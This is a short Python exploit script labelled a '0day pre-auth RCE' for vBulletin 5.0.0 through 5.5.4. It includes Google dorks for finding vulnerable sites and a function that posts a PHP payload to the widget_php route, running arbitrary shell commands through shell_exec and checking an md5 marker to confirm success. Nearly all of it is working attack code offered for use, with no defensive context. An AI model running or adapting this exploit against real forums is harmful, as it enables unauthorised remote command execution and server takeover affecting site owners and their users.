#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5.0.0 till 5.5.4
#
# Google Dorks:
# - site:*.vbulletin.net
# - "Powered by vBulletin Version 5.5.4"

import requests
import sys




params = {"routestring":"ajax/render/widget_php"}

def exploit(url, cmd):
     try:
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"');echo md5('vBulletin'); exit;"
          r = requests.post(url , data = params)
          if r.status_code == 200 or r.status_code ==403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r.content:
               return True
          else:
               return False
     except KeyboardInterrupt:
          return False
     except Exception as e:
          return False


